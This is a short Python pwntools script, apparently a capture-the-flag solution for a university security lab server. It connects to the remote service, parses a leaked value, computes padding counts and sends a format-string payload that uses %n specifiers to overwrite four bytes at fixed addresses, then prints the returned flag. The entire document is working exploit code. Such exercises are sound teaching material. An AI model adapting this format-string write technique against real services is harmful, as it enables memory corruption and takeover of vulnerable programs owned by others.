from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = "22196"

r = remote(SERVER,PORT)

msg_received = r.recvline().decode()
r_value = msg_received[-9:]             # without the 0x

first_n = int(r_value[-3:],16)
second_n = int(r_value[-5:-3],16)
third_n = int(r_value[-7:-5],16)
forth_n = int(r_value[-9:-7],16)



first_value = first_n - 16
if first_value < 0:
        first_value += 256
second_value = second_n - first_n
if second_value < 0:
        second_value += 256
third_value = third_n - second_n
if third_value < 0:
        third_value += 256
fourth_value = forth_n - third_n
if fourth_value < 0:
        fourth_value += 256
        

first_byte = str(first_value).encode()
second_byte = str(second_value).encode()
third_byte = str(third_value).encode()
fourth_byte = str(fourth_value).encode()

msg = (
        b"\x70\xa0\x04\x08" + 
        b"\x71\xa0\x04\x08" +
        b"\x72\xa0\x04\x08" +
        b"\x73\xa0\x04\x08" +
        b"%" + first_byte + b"x%7$n"+
        b"%" + second_byte + b"x%8$n"+
        b"%" + third_byte + b"x%9$n"+
        b"%" + fourth_byte + b"x%10$n"
       )


r.sendline(msg)

print(f"Flag: {r.recvall()}")

r.close()